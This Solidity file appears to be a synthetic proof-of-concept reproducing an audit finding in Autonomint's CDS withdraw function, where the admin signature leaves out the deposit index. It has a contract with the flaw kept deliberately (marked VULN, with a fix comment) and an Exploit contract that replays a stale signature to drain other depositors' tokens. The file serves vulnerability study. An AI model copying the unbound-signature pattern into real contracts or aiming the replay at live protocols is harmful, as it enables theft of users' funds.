// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Autonomint — CDS.withdraw replays excessProfitCumulativeValue (Sherlock, finding 45458).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _verify signs (excessProfitCumulativeValue, nonce) and not the deposit index.
    A CDS owner replays an older signature whose excess is 0. Profit is
    deposited * (valDiff - excess) / 1e11, so the payout is 3,000 USDA instead of the
    2,000 the current excess allows. The other owners' 1,000 USDA is gone.
    Signatures are raw ecrecover over keccak(abi.encode(excess, nonce)) from the
    Anvil admin 0xf39F…2266 (--no-hash). Vulnerable line preserved verbatim (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CDS {
    address public constant ADMIN = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint256 public constant VAL_DIFF = 2e11;
    Token public usda;
    mapping(uint64 => uint256) public deposits;
    uint256 public paid;
    error NotAdmin();

    constructor(Token usda_) {
        usda = usda_;
    }

    function open(uint64 index, address user, uint256 amount) external {
        deposits[index] = amount;
        user;
    }

    function withdraw(uint64 index, uint256 excessProfitCumulativeValue, uint256 nonce, bytes memory signature) external {
        if (!_verify(excessProfitCumulativeValue, nonce, signature)) revert NotAdmin();
        uint256 depositedAmount = deposits[index];
        uint256 profit = (depositedAmount * (VAL_DIFF - excessProfitCumulativeValue)) / 1e11;
        uint256 pay = depositedAmount + profit;
        usda.transfer(msg.sender, pay);
        paid = pay;
    }

    function _verify(uint256 excessProfitCumulativeValue, uint256 nonce, bytes memory signature) internal view returns (bool) {
        bytes32 hash = keccak256(abi.encode(excessProfitCumulativeValue, nonce)); // @> VULN: deposit index is not in the signed payload, so a smaller excess replays
        // FIX: hash = keccak256(abi.encode(index, excessProfitCumulativeValue, nonce));
        require(signature.length == 65, "sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(hash, v, r, s) == ADMIN;
    }

    function honestPayout(uint256 depositedAmount) external pure returns (uint256) {
        uint256 excess = 1e11;
        uint256 profit = (depositedAmount * (VAL_DIFF - excess)) / 1e11;
        return depositedAmount + profit;
    }
}

contract Exploit {
    Token public usda; // nonce 1
    CDS public cds; // nonce 2
    uint256 public profit;
    // excess = 0, nonce = 1. cast wallet sign --no-hash of keccak(abi.encode(0, 1)).
    bytes public constant STALE_SIG =
        hex"7479fd19b7fa8849b1280791bb1679379532f65c2c3fb351530d6da1a051eb777b611e4a60d7309ba0ea7f43e2009dccf9ed13b4551ce0774a94da6aaae7b62b1b";

    constructor() {
        usda = new Token("USDA");
        cds = new CDS(usda);
    }

    function run() external {
        uint64 index = 1;
        cds.open(index, address(this), 1000 ether);
        usda.mint(address(cds), 3000 ether);
        cds.withdraw(index, 0, 1, STALE_SIG);
        uint256 got = usda.balanceOf(address(this));
        usda.transfer(msg.sender, got);
        profit = usda.balanceOf(msg.sender);
        require(profit == 3000 ether, "inflated payout not received");
        require(cds.paid() == 3000 ether, "cds did not pay 3000");
        require(usda.balanceOf(address(cds)) == 0, "other owners still funded");
        require(cds.honestPayout(1000 ether) == 2000 ether, "honest quote");
        require(profit > cds.honestPayout(1000 ether), "no excess taken");
    }
}
